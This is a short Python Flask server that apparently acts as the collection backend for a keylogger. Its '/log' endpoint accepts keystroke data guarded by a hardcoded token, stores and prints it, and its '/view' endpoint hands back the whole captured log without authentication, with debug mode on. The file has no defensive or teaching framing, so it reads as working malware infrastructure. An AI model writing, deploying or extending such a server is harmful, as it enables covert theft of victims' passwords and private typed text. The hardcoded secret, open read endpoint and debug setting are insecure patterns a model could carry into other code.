from flask import Flask, request, jsonify

app = Flask(__name__)
keystroke_log = []
API_TOKEN = "s3cr3t"

@app.route('/log', methods=['POST'])
def log_key():
    data = request.get_json()
    if data.get("token") != API_TOKEN:
        return jsonify({"error": "unauthorized"}), 403

    key_data = data.get("data")
    if key_data:
        keystroke_log.append(key_data)
        print(f"התקבל: {key_data}")
    return jsonify({"status": "ok"})

@app.route('/view', methods=['GET'])
def view_log():
    return jsonify(keystroke_log)

if __name__ == '__main__':
    app.run(debug=True)